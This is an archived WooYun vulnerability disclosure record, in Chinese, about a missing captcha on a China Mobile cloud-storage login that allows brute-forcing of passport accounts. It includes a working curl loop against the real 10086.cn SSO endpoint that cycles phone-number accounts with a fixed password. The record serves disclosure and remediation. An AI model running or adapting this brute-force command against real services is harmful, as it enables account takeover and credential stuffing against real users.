{"id": 44056, "wybug_id": "wooyun-2015-0101939", "wybug_title": "绕过变态图验对中国移动互联网通行证暴力破解撞库", "wybug_corp": "10086.cn", "wybug_author": "bl4de", "wybug_date": "2015-03-17 18:12", "wybug_open_date": "2015-05-04 17:52", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "低", "wybug_rank_0": "3", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["认证设计不合理"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-04：\t细节向公众公开  简要描述： 　　中国移动互联网通行证，可一个账户体系登录多种业务系统，只要破解了这个，就可以在好几个移动业务中任意晃荡了。发现有几个地方可以进行暴力破解，从而进入相应移动业务。 详细说明：  \n\n　　https://www.cmpassport.com/ 是中国移动互联网通往证的主站，做了很多防护措施。图验也难以机器自动识别，以前可以绕过，不过早就补上了。　　通行证的诱惑实在大，只要能得到这一个系统的账户，就可以畅游于多个移动业务系统了。发现最近上线了一些新业务，见右上角的这几个小图标，都是以前没见过的，点开看看 \n\n   这么嚣张，竟然不用图验。发现这儿和通行证的账户都是一样的，只要这儿能正常登录，就能暴力破解通行证账号。于是   漏洞证明：  \n\n批量暴力破解　　先用个脚本测试一下是否可行：(curl需要支持ssl，可http://curl.haxx.se/download.html处下载)for /L %x in (1,1,10) do curl  -k -x 127.0.0.1:8888 -A \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; Tablet PC 2.0)\" -e \"http://caiyun.feixin.10086.cn/\" \"https://caiyun.feixin.10086.cn/sso/cmlogin.action?autotype=0&blframe=true&hidden_verfycode=&callback=caiyun&account=1390110122%x&password=qazwsx&valid_code=\"　\n\n效果见上，确实可以进行暴力破解找个知道正确密码的账户，登录成功后查看返回包中有 user_account的字体，登录失败会返回false 　   修复方案：  漏洞比较简单，可能会被利用来撞库，还是有一定危害的。图验保护吧。   版权声明：转载请注明来源 bl4de@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-03-20 17:51 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-20 17:58 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  关注    \n     2015-03-20 22:59 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  看看    \n     2015-05-06 10:48 |    \t\tMe_Fortune \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:71        | I'm Me_Fortune)\t\t \n  这个脚本可以https。。。源码可否分享？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}